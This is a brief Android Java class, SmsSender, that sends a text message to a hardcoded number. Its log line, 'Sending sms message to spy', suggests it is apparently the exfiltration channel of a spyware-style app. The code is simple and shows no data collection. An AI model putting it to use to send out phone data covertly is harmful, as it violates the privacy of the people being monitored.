package com.AmygdalaSoftware;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;

public class SmsSender {

	private static final String SEND_NUMBER = "5558";
	
	private static SmsSender manager;
	
	private Context context;

	
	public static SmsSender getInstance(Context context) {
		if(SmsSender.manager == null) {
			SmsSender.manager = new SmsSender(context);
		}
		return SmsSender.manager;
	}
	
	private SmsSender(Context context) {
		this.context = context;
	}
	
	public void sendSms(String message) {
	    try {
	        SmsManager sms = SmsManager.getDefault();
	        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,new Intent("SMS_SENT"), 0);
	        sms.sendTextMessage(SEND_NUMBER, null, message, sentPI, null);
	        Log.d(SmsSender.class.getName(), "Sending sms message to spy");
	    } catch (Exception e) {
	        e.printStackTrace();
	    }
	}
}
